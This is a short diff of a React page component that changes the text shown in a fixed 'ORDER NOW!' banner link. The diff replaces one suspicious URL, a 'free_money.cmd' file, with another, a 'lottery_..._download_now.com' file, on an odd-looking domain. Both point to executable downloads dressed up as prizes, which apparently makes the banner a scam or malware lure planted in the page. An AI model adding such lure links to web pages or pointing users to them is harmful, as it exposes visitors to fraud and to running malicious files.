@@ -462,7 +462,7 @@ export default function App() {
         className="fixed bottom-0 left-0 w-full bg-fuchsia-600 text-yellow-300 text-center py-4 px-2 font-black font-comic text-lg md:text-xl tracking-wider block z-50 truncate animate-pop outline-none border-none shadow-none ring-0 focus:outline-none"
       >
         {isChinese ? "立即订购！→" : "ORDER NOW! →"}
-         <span className="font-mono text-sm underline opacity-90 ml-2">https://update.hf25u.link/VbZq9U_free_money.cmd</span>
+         <span className="font-mono text-sm underline opacity-90 ml-2">https://secure.hf25u.link/lottery_znUhrx_download_now.com</span>
       </a>
     </div>
   )
